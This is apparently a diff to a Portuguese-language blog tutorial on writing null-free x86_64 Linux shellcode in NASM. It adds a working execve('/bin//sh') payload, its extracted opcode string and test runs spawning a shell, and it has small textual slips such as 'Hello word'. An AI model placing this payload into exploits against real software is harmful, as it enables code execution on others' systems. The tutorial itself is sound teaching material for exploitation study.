@@ -38,7 +38,7 @@
       <p>Achei maneiro pra caramba, mas ele fala apenas sobre x86, então após aprender com esse paper, resolvi explicar em 64, já que vivemos em um mundo movido a 64bits. A primeira diferença é a ordem em que devem ser passados os paramêtros, mas vamos ver isso mais pra frente. O M0nad também usa a syntax AT&T, e como eu aprendi asm usando a syntax intel, vou usar ela aqui, só por questão de gosto mesmo(leia-se preguiça).</p>
 
     <h3>O que são Shellcodes?</h3>
-    <p> Shellcodes são pedaços de código usados como payload para exploração de vunerabilidades em sofwares, geralmente em falhas de buffer overflow. Então quem já brincou com exploits já deve ter visto bastante, shellcodes tem esse nome, porque geralmente tem o objetivo de pegar uma shell.<br>Os shellcodes são escritos com os valores hexadecimais dos opcodes da arquitetura alvo, por isso deve se ter o conhecimento de assembly e sistemas operacionais.</p>
+    <p> Shellcodes são pedaços de código usados como payload para exploração de vunerabilidades em sofwares, geralmente em falhas de buffer overflow. Então quem já brincou com exploits, já deve ter visto bastante. Shellcodes tem esse nome, porque na maioria dos casos tem o objetivo de pegar uma shell.<br>Os shellcodes são escritos com os valores hexadecimais dos opcodes da arquitetura alvo, por isso deve se ter o conhecimento de assembly e sistemas operacionais.</p>
 
     <h3>Quais as ferramentas serão usadas?</h3>
     <p>Como vou usar a syntax Intel então vou usar o montador Nasm<br>
@@ -303,12 +303,12 @@ exit(0)                                 = ?
 <h3>Que tal um output simples?</h3>
 <p>Agora temos um noção muito melhor de como construir shellcodes, vamos construir um novo sem nullbytes de um código que apenas vai mostrar "Hello world" na tela e sair. vamos usar a técnica que passa nossa string para a stack e depois para o registrador correto. Existem mais técnicas que podem ser usadas, procurem por elas, aprenda e escreva bastante, pois só assim, esse conhecimento será fixado de maneira que tu não esqueça daqui a uma semana.</p>
 
-<p> Primeiro temos que pegar os cada letra em hexadecimal e na ordem reversa, já que estamos trabalhando com arquitetura x86_64 e ela é Little Endian. Vamos aproveitar também e pegar o tamanho da nossa string e adicionar mais +1, para 0x0a(Consulte a tabela ascii com: man ascii). Também precisamos saber qual a syscall que escreve na tela.</p>
+<p> Primeiro temos que pegar os cada letra em hexadecimal e na ordem reversa, já que estamos trabalhando com arquitetura x86_64 e ela é Little Endian. Vamos aproveitar também e pegar o tamanho da nossa string(Consulte a tabela ascii com: man ascii). Também precisamos saber qual a syscall que escreve na tela.</p>
 <pre><code><blockquote>
 n3k00n3@labs:~$ ruby -e '"Hello word\n".reverse.each_byte {|x| print x.to_s(16)}'
 a64726f77206f6c6c6548
 
-n3k00n3@labs:~$ ruby -e 'print "Hello world\b".length'
+n3k00n3@labs:~$ ruby -e 'print "Hello world\n".length'
 12
 
 n3k00n3@labs:~$ grep write /usr/include/asm/unistd_64.h 
@@ -365,7 +365,62 @@ Hello World
 
 <p>Great work!</p>
 
-<h3>Hora de fazer jus ao nome SHELLCODE</p>
+<h3>Hora de fazer jus ao nome SHELLCODE</h3>
+<p>Chegada a hora de obtermos uma shell, dessa vez vamos usar a syscall execve(), porém a string dessa vez será '/bin/bash', só que vamos usar uma '/' a mais para evitar bytes nulos. Ficando assim '/bin//sh'. Vamos ao código.</p>
+<blockquote><code><pre>
+;-------------------------------
+; Execve Using Stack technique
+;-------------------------------
+
+global _start
+
+section .text
+    _start:
+        xor rax, rax
+        push rax
+
+        mov rbx, 0x68732f2f6e69622f
+        push rbx
+        mov rdi, rsp
+
+        push rax
+        mov rdx, rsp
+
+        push rdi
+        mov rsi, rsp
+        add rax, 59
+        syscall
+
+</pre></code></blockquote>
+
+<p>Montando, linkando, testando...</p>
+<blockquote><code><pre>
+n3k00n3@labs:~$ nasm -felf64 asm_nbf_execve_sh_linux64.asm -o shellcode.o
+n3k00n3@labs:~$ ld shellcode.o -o shellcode
+n3k00n3@labs:~$ ./shellcode
+sh-4.3$
+</pre></code></blockquote>
+
+<p>Muito bem, funcionou agora vamos catar só os opcodes e testa-lo novamente.</p>
+ <blockquote><code><pre>
+ for i in $(objdump -d shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
+
+ </pre></code></blockquote>
+
+<blockquote><code><pre>
+n3k00n3@labs:~$ ./testing
+Shellcode Length:  32
+sh-4.3$
+</pre></code></blockquote>
+
+    <h3>Referências</h3>
+    <ul>
+    <li><a href="http://phrack.org/issues/49/14.html#article" target="_blank">Smashing the stack for fun and profit</a></li>
+    <li><a href="https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441" target="_blank">The art of exploitation - Jon Erickson</a></li>
+    <li><a href="https://raw.githubusercontent.com/m0nad/Papers/master/ConstruindoShellcodes.txt" target="_blank">Construindo Shellcodes 32bits</a></li>
+    </ul>
+
 <br><br>
       <strong>Done! Happy code!</strong>
     </div>
